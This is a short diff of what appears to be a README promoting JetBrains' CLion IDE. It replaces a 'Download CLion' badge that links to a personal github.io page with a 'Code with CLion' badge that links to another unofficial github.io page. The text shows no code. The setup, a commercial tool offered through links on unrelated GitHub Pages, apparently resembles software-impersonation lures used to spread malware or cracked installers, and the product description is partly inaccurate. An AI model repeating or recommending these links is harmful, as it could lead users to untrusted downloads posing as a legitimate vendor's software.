@@ -9,7 +9,7 @@
 
 CLion is an enterprise-grade integrated development environment optimized for the Windows platform, engineered specifically for C and C++ software development. It provides native support for CMake, Gradle, and compilation databases, offering deep code inspection, instant refactoring, and integrated unit testing. By automating build configuration and providing real-time static analysis, the software eliminates boilerplate management friction from complex systems programming workflows.
 
-[![Download CLion](https://img.shields.io/badge/Download-CLion-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://sarahbakerl764.github.io/.github/CLion-Integrated-Platform)
+[![Code with CLion](https://img.shields.io/badge/Code%20with-CLion-0D9488?style=flat)](https://clion-platform.github.io/.github/)
 
 ---
 
